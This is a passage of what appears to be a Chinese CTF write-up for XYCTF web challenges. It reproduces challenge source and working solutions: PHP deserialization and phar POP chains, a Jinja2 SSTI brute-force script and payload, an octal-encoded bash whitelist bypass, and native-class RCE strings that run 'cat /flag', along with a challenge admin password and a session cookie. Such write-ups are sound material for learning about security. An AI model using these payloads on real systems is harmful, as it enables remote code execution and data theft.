class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;win&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = [<span class="number">1</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><p>配合fast-destruct</p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>admin密码: asdqwe</p><p>找catch_warnings</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xyctf.top:36318/index&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZgzePQ.xovem1N0fv78Nth8E0_iXRxY7UA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&#x27;?sentence=你好()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(&#123;&#125;)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = url + sentence</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">    res = requests.get(url=payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)), headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;found catch_warnings is in &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;出现了一点小问题&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#found catch_warnings is in 221</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sentence=你好()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(221)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)</span><br><span class="line">&amp;x1=__class__</span><br><span class="line">&amp;x2=__base__</span><br><span class="line">&amp;x3=__subclasses__</span><br><span class="line">&amp;x4=__getitem__</span><br><span class="line">&amp;x5=__init__</span><br><span class="line">&amp;x6=__globals__</span><br><span class="line">&amp;x7=__builtins__</span><br><span class="line">&amp;x8=eval</span><br><span class="line">&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>没什么好说的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;password = &amp;<span class="variable">$nacl</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd_char</span>) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;foreach&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>$0为当前运行的脚本(即bash), 然后用八进制ascii传入cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\040\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p>简单的phar反序列化, 生成的phar文件用gzip压缩绕过题目的waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;print_r(file_get_contents(array_rand(array_flip(scandir(end(array_reverse(str_split(getcwd()))))))));__halt_compiler();__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=phar:///tmp/364be8860e8d72b4358b5e88099a935a.png/flag.txt</span><br></pre></td></tr></table></figure><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>这种就只能考虑原生类读文件了, 我找到了SimpleXMLElement这个类,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SimpleXMLElement&amp;aa=&lt;element&gt;system&lt;/element&gt;&amp;c=__toString&amp;b=SimpleXMLElement&amp;bb=&lt;element&gt;cat /flag&lt;/element&gt;</span><br></pre></td></tr></table></figure><p>看其他师傅的wp, 也可以使用Error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>很抽象, 用bash时间盲注枚举flag</p><p>贴出我的答辩脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 